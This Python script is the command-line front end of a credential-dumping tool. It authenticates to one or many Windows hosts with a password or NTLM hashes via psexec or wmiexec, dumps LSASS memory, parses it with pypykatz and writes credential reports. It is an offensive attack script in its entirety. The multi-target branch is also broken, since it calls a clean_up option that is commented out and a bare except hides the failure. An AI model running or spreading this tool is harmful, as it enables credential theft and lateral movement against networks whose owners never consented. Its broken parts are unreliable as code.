from cred_tool import Dumper
import argparse
import sys
import pdb


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--username", help="Username to login with")
    parser.add_argument("-p", "--password", help="Password to login with")
    parser.add_argument("--hashes", help="NTLM hashes, format is LM:NT")
    parser.add_argument("-d", "--domain", help="User domain")
    parser.add_argument("-H", "--target", help="Target host")
    parser.add_argument(
        "-L", "--target_file", help="File with targets ip, line by line"
    )
    parser.add_argument(
        "-vr",
        "--verbose_report",
        type=int,
        help="equals 1 or 0| Creds obtaining location will be written in report file",
    )
    parser.add_argument("--auth", help="Auth with psexec or wmiexec")
    # parser.add_argument(
    #     "--clean_up",
    #     type=bool,
    #     help="In case if execution left files on computer, use this to delete those",
    # )
    args = parser.parse_args()
    if len(sys.argv) > 1:
        pass
    else:
        sys.exit(0)
    username = args.username
    password = args.password
    hashes = args.hashes
    if hashes is None:
        hashes = ""
    domain = args.domain
    verbose_report = args.verbose_report
    auth = args.auth
    if args.auth not in ["wmiexec", "psexec"]:
        print("Check auth type")
        sys.exit(1)

    if args.target_file:
        targets_list = []
        with open(args.target_file, "r") as f:
            targets_list = f.readlines()
        for target in targets_list:
            try:
                task = Dumper(
                    username=username,
                    password=password,
                    domain=domain,
                    target=target.strip(),
                    auth=auth,
                    hashes=hashes,
                )
                if args.clean_up is not None:
                    task.clean_up()
                    sys.exit(0)

                task.run()
                Dumper.dump_to_pypykatz(dump_file="./lsass_dump.dmp")
                Dumper.create_report(
                    filename="./temp_report.json", verbose=verbose_report
                )
            except:
                print(f"Something went wrong with {target}")
    else:
        target = args.target
        task = Dumper(
            username=username,
            password=password,
            domain=domain,
            target=target,
            auth=auth,
            hashes=hashes,
        )
        # if args.clean_up is not None:
        #     task.clean_up()
        #     sys.exit(0)
        task.run()
        Dumper.dump_to_pypykatz(dump_file="./lsass_dump.dmp")
        Dumper.create_report(
            filename=f"./reports/{target}_report.txt", verbose=verbose_report
        )


if __name__ == "__main__":
    main()
